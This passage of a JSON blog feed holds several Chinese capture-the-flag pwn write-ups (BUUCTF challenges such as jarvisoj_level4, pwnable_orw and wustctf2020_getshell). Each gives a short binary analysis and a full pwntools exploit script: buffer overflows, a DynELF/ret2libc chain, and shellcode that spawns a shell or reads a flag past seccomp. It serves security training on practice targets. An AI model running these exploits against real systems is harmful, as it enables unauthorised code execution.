id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp:</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./mrctf2020_shellcode'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"magic!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>直接打通本地<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7AOot.md.png\" alt=\"\" /></p>\n<p>远程<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7AxW8.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/23/pwn/%E5%88%B7%E9%A2%98/BUUCTF/jarvisoj_level4/",
            "url": "https://vvwwvv.cn/2023/09/23/pwn/%E5%88%B7%E9%A2%98/BUUCTF/jarvisoj_level4/",
            "title": "jarvisoj_level4（DynELF）",
            "date_published": "2023-09-23T09:08:15.000Z",
            "content_html": "<h1 id=\"1分析程序\"><a class=\"anchor\" href=\"#1分析程序\">#</a> 1. 分析程序</h1>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/23/pPTNUzQ.png\" alt=\"\" /><br />\n32 位程序没有开启 NX 和 pie</p>\n<p>ida 查看一下</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/23/pPTNrd0.png\" alt=\"\" /></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/23/pPTNsoV.png\" alt=\"\" /></p>\n<p>发现 vuln 函数可以进行溢出，但是没有发现后门函数，所以我们利用 ret2libc</p>\n<p>呃。。。</p>\n<p>利用 ret2libc 没有打通，换个方式利用 DynELF</p>\n<h1 id=\"2利用dynelf\"><a class=\"anchor\" href=\"#2利用dynelf\">#</a> 2. 利用 DynELF</h1>\n<p>构造 <code>leak</code>  函数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span>add<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#add 为想泄露的函数地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">140</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    fun_add<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> fun_add</pre></td></tr></table></figure><p>实例化 <code>DynELF</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>d<span class=\"token operator\">=</span>DynELF<span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">,</span>elf<span class=\"token operator\">=</span>e<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>获取 <code>system</code>  和 <code>read</code>  地址 (因为程序里没有 <code>/bin/sh</code>  需要我们自己写入)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>system<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"libc\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>read<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp:</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./level4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote(\"node4.buuoj.cn\",28089)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./level4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>write_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>write_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>read_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>bbs<span class=\"token operator\">=</span><span class=\"token number\">0x804A024</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>vuln<span class=\"token operator\">=</span><span class=\"token number\">0x804844B</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span>add<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">140</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    fun_add<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> fun_add</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>d<span class=\"token operator\">=</span>DynELF<span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">,</span>elf<span class=\"token operator\">=</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>system<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"libc\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>read<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">140</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>bbs<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>打通本地<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pPTRbfH.png\" alt=\"\" /></p>\n<p>打远程靶机<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pPTRO1A.md.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/22/pwn/%E5%88%B7%E9%A2%98/BUUCTF/orw/",
            "url": "https://vvwwvv.cn/2023/09/22/pwn/%E5%88%B7%E9%A2%98/BUUCTF/orw/",
            "title": "pwnable_orw（手写汇编之shellcode，沙盒机制）",
            "date_published": "2023-09-22T09:08:15.000Z",
            "content_html": "<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p>32 位程序，没有开启 NX，初步认为可以利用 <code>shellcode</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmrOe.png\" alt=\"\" /></p>\n<p>ida 查看<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTm6wd.png\" alt=\"\" /><br />\n看到有一个  <code>orw_seccomp()</code> ， <code>seccomp函数</code> 是一个沙盒机制</p>\n<p>进去查看（关于沙盒详情见文章 <code>沙盒机制</code> ）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmWfP.png\" alt=\"\" /></p>\n<p>利用工具 <code>seccomp-tools</code>  查看具体过滤情况，<br />\n使用命令 <code>seccomp-tools dump ./orw</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmaJx.png\" alt=\"\" /></p>\n<p>看到我们可以使用  <code>open/read/write</code>  函数，可以写入执行这几个的函数的 <code>shellcode</code>  来读取 <code>flag</code></p>\n<ol>\n<li>通过 <code>open</code>  打开 flag 文件</li>\n<li>利用 <code>read</code>  读取 flag 到某一地址</li>\n<li>利用 <code>write</code>  输出这个地址的 flag 即可</li>\n</ol>\n<h1 id=\"2shellcode-构造\"><a class=\"anchor\" href=\"#2shellcode-构造\">#</a> 2.shellcode 构造</h1>\n<p>利用系统调用方式：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTuPKS.png\" alt=\"\" /></p>\n<h2 id=\"1利用shellcraft构造\"><a class=\"anchor\" href=\"#1利用shellcraft构造\">#</a> 1. 利用 shellcraft 构造</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode<span class=\"token operator\">=</span>shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./flag\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token string\">'eax'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#此处 eax 为 3（打开 0，1，2 标准输入，标准输出，标准错误）</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#read 函数的 fd 之所以是 3，是因为默认情况下，0,1,2 这三个句柄对应的是标准输入，标准输出，标准错误，系统进程默认会打开 0，1，2 这三个文件描述符。所以通常我们 open 的返回值是从 3 开始的（系统调用返回值会保存在 eax 中）</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#记得要用 asm 转成汇编</span></pre></td></tr></table></figure><h2 id=\"2手动构造\"><a class=\"anchor\" href=\"#2手动构造\">#</a> 2. 手动构造</h2>\n<p>1. 调用 open 打开 flag 文件：88</p>\n<p>调用函数为 <code>sys_open(const *path,0,0)</code></p>\n<pre><code>push 0x0 #字符串是以\\x00结尾\npush 0x67616c66 #flag的ascill码，小端序（66 &quot;f&quot; ,6c &quot;l&quot; ,61 &quot;a&quot; ,67 &quot;g&quot;）\nmov ebx,esp\nxor    ecx,ecx\nxor    edx,edx\nmov  eax, 0x5\nint     0x80\n</code></pre>\n<p>这里解释为什么先要 <code>push 0x0</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTl3y6.png\" alt=\"\" /></p>\n<p>2. 调用 read 读取 flag</p>\n<p>调用函数为 <code>read(0x3,esp,0x100)</code> (0x3 为文件描述符 0,1,2，写入到 esp，这一部分 esp 没有进行调用不会被影响)</p>\n<pre><code>mov ebx,0x3\nmov ecx,esp\nmov edx, 0x100\nmov eax,0x3\nint     0x80\n</code></pre>\n<p>3. 调用 write 将 flag 从上面写入的位置输出到屏幕</p>\n<p>调用的函数为 <code>write(0x1,esp,0x100)</code></p>\n<pre><code>mov ebx,0x1\nmov ecx,esp\nmov edx,0x100\nmov eax, 0x4\nint   0x80\n\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\" ;    ;    ;      ; \"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"只有这里最后一个不用加分号\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里就构造完毕 shellcode 了</p>\n<h1 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp:</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./orw')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27810</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#shellcode = (shellcraft.open(\"./flag\"))</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#shellcode+=(shellcraft.read('eax','esp',100))</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#shellcode+=(shellcraft.write(1,'esp',100))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>shellcode<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push 0x0 ;push 0x67616c66 ;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax, 0x5;int 0x80;\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>shellcode<span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov ebx,0x3;mov ecx,0x804A0A0;mov edx, 0x100;mov eax,0x3;int 0x80;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>shellcode<span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov ebx,0x1;mov ecx,0x804A0A0;mov edx,0x100;mov eax, 0x4;int 0x80\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"your shellcode:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#payload1=p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#payload1=p64()+p64()+p64()+p64()</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,\"b *\")</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#gdb.attach(pid)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#p.recvuntil(\"\")</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#payload2=p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#payload2=p64()+p64()+p64()+p64()</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#p.sendline(payload2)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>本地仍然打不通，应该是环境问题</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/23/pPTY8OI.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/19/pwn/%E5%88%B7%E9%A2%98/BUUCTF/wustctf2020_getshell/",
            "url": "https://vvwwvv.cn/2023/09/19/pwn/%E5%88%B7%E9%A2%98/BUUCTF/wustctf2020_getshell/",
            "title": "wustctf2020_getshell",
            "date_published": "2023-09-19T07:45:26.695Z",
            "content_html": "<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p>查看程序开启的保护<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP4x3lT.png\" alt=\"\" /><br />\n 32 位程序，没有开启 NX，猜测可以使用 shellcode</p>\n<p>利用 ida 反汇编</p>\n<p>主函数<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP4xr6O.png\" alt=\"\" /><br />\n init（）：输出图形<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP4x6ne.png\" alt=\"\" /><br />\n vulnerable () ：可以进行溢出，但是溢出范围很小<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP4xIc8.png\" alt=\"\" /></p>\n<p>发现有后门命令在 shell 函数里</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP4zFE9.png\" alt=\"\" /></p>\n<p>直接溢出执行该命令即可</p>\n<h1 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_getshell')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28324</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"/_/ /_//_\\\\_\\\\ \\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">28</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x804851B</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP4zOqe.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/17/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ez_pz_hackover_2016/",
            "url": "https://vvwwvv.cn/2023/09/17/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ez_pz_hackover_2016/",
            "title": "ez_pz_hackover_2016（shellcode）",
            "date_published": "2023-09-17T14:30:51.512Z",
